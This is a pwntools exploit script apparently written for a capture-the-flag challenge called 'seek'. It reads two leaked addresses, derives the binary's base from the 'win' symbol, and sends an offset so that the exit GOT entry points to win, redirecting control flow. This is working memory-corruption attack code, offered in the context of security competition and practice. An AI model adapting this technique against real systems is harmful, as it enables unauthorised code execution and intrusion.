#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import os, sys

os.chdir(os.path.dirname(os.path.abspath(__file__)))

exe = context.binary = ELF('./chal',checksec=False)

host = args.HOST or 'seek.chal.irisc.tf'
port = int(args.PORT or 10004)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        io = start_remote(argv, *a, **kw)
        print(io.recvuntil(b'Solution?').decode())
        a = input('ok ?')
        io.sendline(a)
        return io

# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.recvuntil(b'around 0x')
a1 = int(io.recv(12),16)
log.success(f'{a1 = :x}')

io.recvuntil(b'at 0x')
a2 = int(io.recv(12),16)
log.success(f'{a2 = :x}')

exe.address = a1-exe.sym['win']
io.sendlineafter(b'into? ', str(exe.got['exit']-a2).encode())

if '-i' in sys.argv or args.GDB:
    io.interactive()

